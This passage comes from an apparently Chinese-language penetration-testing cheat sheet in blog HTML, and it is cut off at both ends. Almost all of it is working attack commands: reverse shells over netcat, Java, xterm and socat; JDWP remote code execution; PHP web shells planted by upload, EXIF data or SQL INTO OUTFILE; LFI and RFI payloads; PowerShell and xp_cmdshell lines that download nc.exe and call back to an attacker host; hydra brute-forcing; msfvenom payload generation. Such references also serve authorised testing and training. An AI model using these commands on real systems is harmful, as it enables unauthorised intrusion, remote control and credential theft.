2&gt;&amp;%d&quot;,f,f,f)&apos;</span><br></pre></td></tr></table></figure><h3 id="Netcat-without-e-1"><a href="#Netcat-without-e-1" class="headerlink" title="Netcat without -e #1"></a>Netcat without -e #1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.0.0.1 1234 &gt; /tmp/f</span><br></pre></td></tr></table></figure><h3 id="Netcat-without-e-2"><a href="#Netcat-without-e-2" class="headerlink" title="Netcat without -e #2"></a>Netcat without -e #2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc localhost 443 | /bin/sh | nc localhost 444</span><br><span class="line">telnet localhost 443 | /bin/sh | telnet localhost 444</span><br></pre></td></tr></table></figure><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime(); p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]); p.waitFor();</span><br></pre></td></tr></table></figure><h3 id="XTerm"><a href="#XTerm" class="headerlink" title="XTerm"></a>XTerm</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">反弹shell最简单的形式之一就是xterm会话,应在服务器上运行以下命令.它将尝试TCP端口6001上连接你的(10.0.0.1)</span><br><span class="line"> </span><br><span class="line">xterm -display 10.0.0.1:1</span><br><span class="line"> </span><br><span class="line">传入xterm,启动X-Server(1-监听TCP 6001).一种方法使用Xnest(在你系统上运行)</span><br><span class="line">Xnest：1</span><br><span class="line">你需要在授权目标上连接你 </span><br><span class="line">xhost + targetip</span><br></pre></td></tr></table></figure><h2 id="JDWP远程命运执行漏洞"><a href="#JDWP远程命运执行漏洞" class="headerlink" title="JDWP远程命运执行漏洞"></a>JDWP远程命运执行漏洞</h2><p>漏洞验证：</p><p>telnet端口后，输入命令JDWP-Handshake，如果返回JDWP-Handshake，证明存在漏洞。而且如果输入JDWP-Handshake的速度不够快的话，连接很快就会断开。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 目标IP 目标端口</span><br></pre></td></tr></table></figure><p>漏洞利用脚本：<a href="https://github.com/IOActive/jdwp-shellifier" target="_blank" rel="noopener">https://github.com/IOActive/jdwp-shellifier</a></p><p>使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 目标主机ip -p jdwp运行端口 --cmd &quot;Your Command&quot;</span><br></pre></td></tr></table></figure><p>比如我们可以执行一个反弹shell的命令：</p><p>漏洞利用过程如下：</p><p>攻击者主机上执行监听命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure><p>被攻击的目标主机上执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd &quot;ncat -lvvp 1234 -e /bin/bash&quot;</span><br></pre></td></tr></table></figure><p>修复建议：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">关闭JDWP端口，或者JDWP端口不对公网开放</span><br><span class="line">关闭Java的debug模式（开启该模式对服务器性能有影响）</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://www.bugbank.cn/pwn/detail/5750445bbcd7a4e777c3dcb2.html" target="_blank" rel="noopener">https://www.bugbank.cn/pwn/detail/5750445bbcd7a4e777c3dcb2.html</a></p><p>​                  <a href="https://blog.csdn.net/wanzt123/article/details/82793023" target="_blank" rel="noopener">https://blog.csdn.net/wanzt123/article/details/82793023</a></p><h2 id="Working-with-Restricted-Shells"><a href="#Working-with-Restricted-Shells" class="headerlink" title="Working with Restricted Shells"></a>Working with Restricted Shells</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># rare cases</span><br><span class="line">ssh bill@localhost ls -l /tmp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nice /bin/bash</span><br></pre></td></tr></table></figure><h2 id="Interactive-TTY-Shells"><a href="#Interactive-TTY-Shells" class="headerlink" title="Interactive TTY Shells"></a>Interactive TTY Shells</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/expect sh</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c ‘import pty; pty.spawn(“/bin/sh”)’</span><br><span class="line"># execute one command with su as another user if you do not have access to the shell. Credit to g0blin.co.uk</span><br><span class="line">python -c &apos;import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen([&quot;/bin/su&quot;,&quot;-c&quot;,&quot;id&quot;,&quot;bynarr&quot;],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,&quot;fruity\n&quot;);time.sleep(0.1);print os.read(master,1024);&apos;</span><br></pre></td></tr></table></figure><p>使用socat</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#Listener</span><br><span class="line">socat file:&apos;tty&apos;,raw,echo=0 tcp-listen:4444</span><br><span class="line">#Victim</span><br><span class="line">socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint tcp:10.0.3,4:4444</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://www.anquanke.com/post/id/86444" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86444</a></p><h2 id="通过form表单进行文件上传"><a href="#通过form表单进行文件上传" class="headerlink" title="通过form表单进行文件上传"></a>通过form表单进行文件上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># POST file</span><br><span class="line">curl -X POST -F &quot;file=@/file/location/shell.php&quot; http://$TARGET/upload.php --cookie &quot;cookie&quot;</span><br><span class="line"></span><br><span class="line"># POST binary data to web form</span><br><span class="line">curl -F &quot;field=&lt;shell.zip&quot; http://$TARGET/upld.php -F &apos;k=v&apos; --cookie &quot;k=v;&quot; -F &quot;submit=true&quot; -L -v</span><br></pre></td></tr></table></figure><h2 id="PUT方法"><a href="#PUT方法" class="headerlink" title="PUT方法"></a>PUT方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT -d &apos;&lt;?php system($_GET[&quot;c&quot;]);?&gt;&apos; http://192.168.2.99/shell.php</span><br></pre></td></tr></table></figure><h2 id="Payload生成模式和偏移量"><a href="#Payload生成模式和偏移量" class="headerlink" title="Payload生成模式和偏移量"></a>Payload生成模式和偏移量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000</span><br><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE</span><br></pre></td></tr></table></figure><h2 id="Bypassing-File-Upload"><a href="#Bypassing-File-Upload" class="headerlink" title="Bypassing File Upload"></a>Bypassing File Upload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file.php -&gt; file.jpg</span><br><span class="line">file.php -&gt; file.php.jpg</span><br><span class="line">file.asp -&gt; file.asp;.jpg</span><br><span class="line">file.gif (contains php code, but starts with string GIF/GIF98)</span><br><span class="line">00%</span><br><span class="line">file.jpg with php backdoor in exif (see below)</span><br><span class="line">.jpg -&gt; proxy intercept -&gt; rename to .php</span><br></pre></td></tr></table></figure><h2 id="图片里面注入Code"><a href="#图片里面注入Code" class="headerlink" title="图片里面注入Code"></a>图片里面注入Code</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exiv2 -c&apos;A &quot;&lt;?php system($_REQUEST[&apos;cmd&apos;]);?&gt;&quot;!&apos; backdoor.jpeg</span><br><span class="line">exiftool “-comment&lt;=back.php” back.png</span><br></pre></td></tr></table></figure><h2 id="htaccess技巧"><a href="#htaccess技巧" class="headerlink" title=".htaccess技巧"></a>.htaccess技巧</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .blah</span><br></pre></td></tr></table></figure><h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><h3 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">破解ssh： </span><br><span class="line">hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh </span><br><span class="line">hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh </span><br><span class="line"> </span><br><span class="line">破解ftp： </span><br><span class="line">hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV </span><br><span class="line">hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV </span><br><span class="line">  </span><br><span class="line">get方式提交，破解web登录： </span><br><span class="line">hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/ </span><br><span class="line">hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php</span><br><span class="line"> </span><br><span class="line">post方式提交，破解web登录： </span><br><span class="line">hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form &quot;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password&quot; </span><br><span class="line">hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form &quot;login.php:id=^USER^&amp;passwd=^PASS^:&lt;title&gt;wrong username or password&lt;/title&gt;&quot; </span><br><span class="line">（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,&lt;title&gt;中 的内容是表示错误猜解的返回信息提示。） </span><br><span class="line"> </span><br><span class="line">破解https： </span><br><span class="line">hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https </span><br><span class="line">  </span><br><span class="line">破解teamspeak： </span><br><span class="line">hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak </span><br><span class="line"> </span><br><span class="line">破解cisco： </span><br><span class="line">hydra -P pass.txt 10.36.16.18 cisco </span><br><span class="line">hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable </span><br><span class="line"> </span><br><span class="line">破解smb： </span><br><span class="line">hydra -l administrator -P pass.txt 10.36.16.18 smb </span><br><span class="line"> </span><br><span class="line"> 破解pop3： </span><br><span class="line">hydra -l muts -P pass.txt my.pop3.mail pop3 </span><br><span class="line"> </span><br><span class="line"> 破解rdp： </span><br><span class="line">hydra ip rdp -l administrator -P pass.txt -V </span><br><span class="line">  </span><br><span class="line"> 破解http-proxy： </span><br><span class="line">hydra -l admin -P pass.txt http-proxy://10.36.16.18 </span><br><span class="line"> </span><br><span class="line"> 破解imap： </span><br><span class="line">hydra -L user.txt -p secret 10.36.16.18 imap PLAIN </span><br><span class="line">hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN</span><br><span class="line"></span><br><span class="line"> web爆破</span><br><span class="line"> hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list &quot;/endpoit/login:usernameField=^USER^&amp;passwordField=^PASS^:unsuccessfulMessage&quot; -s PORT -P /usr/share/wordlists/list</span><br><span class="line"> </span><br><span class="line"> 其他类型爆破</span><br><span class="line"> hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1</span><br></pre></td></tr></table></figure><h3 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># Bruteforce based on the pattern;</span><br><span class="line">hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout  </span><br><span class="line"></span><br><span class="line"># Generate password candidates: wordlist + pattern;</span><br><span class="line">hashcat -a6 -m0 &quot;e99a18c428cb38d5f260853678922e03&quot; yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout</span><br><span class="line"></span><br><span class="line"># Generate NetNLTMv2 with internalMonologue and crack with hashcat</span><br><span class="line">InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800</span><br><span class="line"># resulting hash</span><br><span class="line">spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000</span><br><span class="line"></span><br><span class="line"># crack with hashcat</span><br><span class="line">hashcat -m5600 &apos;spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000&apos; -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable</span><br></pre></td></tr></table></figure><h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b &quot;\x00\x0a\x0d&quot; -e x86/shikata_ga_nai</span><br><span class="line"></span><br><span class="line">#LINUX</span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line">#WINDOWS</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">#MAC</span><br><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br><span class="line"></span><br><span class="line">#PHP</span><br><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br><span class="line"></span><br><span class="line">#JSP</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br><span class="line"></span><br><span class="line">#WAR</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br><span class="line"></span><br><span class="line">#PYTHON</span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">#BASH</span><br><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br><span class="line"></span><br><span class="line">#PERL</span><br><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br><span class="line"></span><br><span class="line">#Linux Based Shellcode</span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br><span class="line"></span><br><span class="line">#Windows Based Shellcode</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br><span class="line"></span><br><span class="line">#Mac Based Shellcode</span><br><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><h2 id="Compiling-Code-From-Linux"><a href="#Compiling-Code-From-Linux" class="headerlink" title="Compiling Code From Linux"></a>Compiling Code From Linux</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Windows</span><br><span class="line">i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe</span><br><span class="line"></span><br><span class="line"># Linux</span><br><span class="line">gcc -m32|-m64 -o output source.c</span><br></pre></td></tr></table></figure><h2 id="本地包含shell"><a href="#本地包含shell" class="headerlink" title="本地包含shell"></a>本地包含shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.1.102 80</span><br><span class="line">GET /&lt;?php passthru($_GET[&apos;cmd&apos;]); ?&gt; HTTP/1.1</span><br><span class="line">Host: 192.168.1.102</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"># Then send as cmd payload via http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&amp;cmd=id</span><br></pre></td></tr></table></figure><h2 id="本地文件包含到任意文件读取"><a href="#本地文件包含到任意文件读取" class="headerlink" title="本地文件包含到任意文件读取"></a>本地文件包含到任意文件读取</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br><span class="line"></span><br><span class="line">http://example.com/index.php?page=php://input&amp;cmd=ls</span><br><span class="line">    POST: &lt;?php system($_GET[&apos;cmd&apos;]); ?&gt;</span><br><span class="line">http://192.168.2.237/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input</span><br><span class="line">    POST: &lt;?php system(&apos;uname -a&apos;);die(); ?&gt;</span><br><span class="line"></span><br><span class="line">expect://whoami</span><br><span class="line">http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php</span><br><span class="line">http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php</span><br><span class="line">http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd</span><br><span class="line">http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&amp;cmd=id</span><br><span class="line">http://10.1.1.1/index.php?page=data://text/plain,%3C?php%20system%28%22uname%20-a%22%29;%20?%3E</span><br><span class="line"></span><br><span class="line"># ZIP Wrapper</span><br><span class="line">echo &quot;&lt;pre&gt;&lt;?php system($_GET[&apos;cmd&apos;]); ?&gt;&lt;/pre&gt;&quot; &gt; payload.php;  </span><br><span class="line">zip payload.zip payload.php;   </span><br><span class="line">mv payload.zip shell.jpg;    </span><br><span class="line">http://example.com/index.php?page=zip://shell.jpg%23payload.php</span><br><span class="line"></span><br><span class="line"># Loop through file descriptors</span><br><span class="line">curl &apos;&apos; -H &apos;Cookie: PHPSESSID=df74dce800c96bcac1f59d3b3d42087d&apos; --output -</span><br></pre></td></tr></table></figure><h2 id="远程文件shell：Windows-php"><a href="#远程文件shell：Windows-php" class="headerlink" title="远程文件shell：Windows+php"></a>远程文件shell：Windows+php</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;powershell -Command \&quot;&amp; &#123;(New-Object System.Net.WebClient).DownloadFile(&apos;http://10.11.0.245/netcat/nc.exe&apos;,&apos;nc.exe&apos;); cmd /c nc.exe 10.11.0.245 4444 -e cmd.exe\&quot; &#125;&quot;); ?&gt;</span><br><span class="line"></span><br><span class="line">ps：</span><br><span class="line">cmd /c dir 是执行完dir命令后关闭命令窗口。</span><br><span class="line">cmd /k dir 是执行完dir命令后不关闭命令窗口。</span><br><span class="line">cmd /c start dir 会打开一个新窗口后执行dir指令，原窗口会关闭。</span><br><span class="line">cmd /k start dir 会打开一个新窗口后执行dir指令，原窗口不会关闭。</span><br></pre></td></tr></table></figure><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">http://IP/less-1/index.php?id=2&apos; and 1=2 union select 1,version(),@@basedir--+  // 查询数据库版本号，数据库路径</span><br><span class="line"></span><br><span class="line">http://IP/less-1/index.php?id=2&apos; and 1=2 union select 1,schema_name,3 from  information_schema.schemata limit 3,1   --+ //查找数据库名  --&gt; 得出 第三个数据库名为 security</span><br><span class="line"></span><br><span class="line">ttp://IP/less-1/index.php?id=2&apos; and 1=2 union select 1,table_name,3 from  information_schema.tables where table_schema=database() limit 3,1   --+// 在数据库中查询表名 </span><br><span class="line"></span><br><span class="line">http://IP/less-1/index.php?id=2&apos; and 1=2 union select 1,column_name,3 from  information_schema.columns where table_name=&apos;users&apos; limit 1,1  --+// 在表中查询相应字段名 </span><br><span class="line"></span><br><span class="line">http://IP/less-1/index.php?id=2&apos; and 1=2 union select 1,username,password from  security.users limit 1,1  --+     // 分别得到 这两个字段的 字段2,3</span><br><span class="line"></span><br><span class="line">http://ip/less-1/index.php?id=2&apos; and 1=2 union select 1,load_file(&apos;d:/1.txt&apos;),3  --+ //读取文件</span><br><span class="line"></span><br><span class="line">http://target/index.php?vulnParam=0&apos; UNION ALL SELECT 1,&quot;&lt;?php system($_REQUEST[&apos;cmd&apos;]);?&gt;&quot;,2,3 INTO OUTFILE &quot;c:/evil.php&quot;-- uMj   //上传shell</span><br><span class="line"></span><br><span class="line">select @@basedir   查询数据库安装路径</span><br><span class="line">select @@datadir   查询数据库所在目录</span><br><span class="line">select version()   查询数据库的版本</span><br><span class="line">select user()      查询当前数据库的使用用户</span><br><span class="line">select database()  当前使用数据库的名字</span><br><span class="line"></span><br><span class="line"># sqlmap; post-request - captured request via Burp Proxy via Save Item to File.</span><br><span class="line">sqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --threads 10</span><br><span class="line"></span><br><span class="line"># netcat reverse shell via mssql injection when xp_cmdshell is available//xp_cmdshell</span><br><span class="line">1000&apos;;+exec+master.dbo.xp_cmdshell+&apos;(echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+&gt;+c:\ftp.txt+%26+ftp+-s:c:\ftp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd&apos;;--</span><br></pre></td></tr></table></figure><h2 id="SQLite-Injection-to-Shell-or-Backdoor"><a href="#SQLite-Injection-to-Shell-or-Backdoor" class="headerlink" title="SQLite Injection to Shell or Backdoor"></a>SQLite Injection to Shell or Backdoor</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &apos;/home/www/public_html/uploads/phpinfo.php&apos; as pwn; </span><br><span class="line">CREATE TABLE pwn.shell (code TEXT); </span><br><span class="line">INSERT INTO pwn.shell (code) VALUES (&apos;&lt;?php system($_REQUEST[&apos;cmd&apos;]);?&gt;&apos;);</span><br></pre></td></tr></table></figure><h2 id="MS-SQL-Console"><a href="#MS-SQL-Console" class="headerlink" title="MS-SQL Console"></a>MS-SQL Console</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mssqlclient.py -port 27900 user:password@10.1.1.1</span><br><span class="line">sqsh -S 10.1.1.1 -U user -P password</span><br><span class="line"></span><br><span class="line">mysqlclent.py --&gt;https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py</span><br></pre></td></tr></table></figure><h2 id="无交互式Shell"><a href="#无交互式Shell" class="headerlink" title="无交互式Shell"></a>无交互式Shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty; pty.spawn(&quot;/bin/sh&quot;)&apos;</span><br><span class="line">/bin/busybox sh</span><br></pre></td></tr></table></figure><h2 id="Python代码执行"><a href="#Python代码执行" class="headerlink" 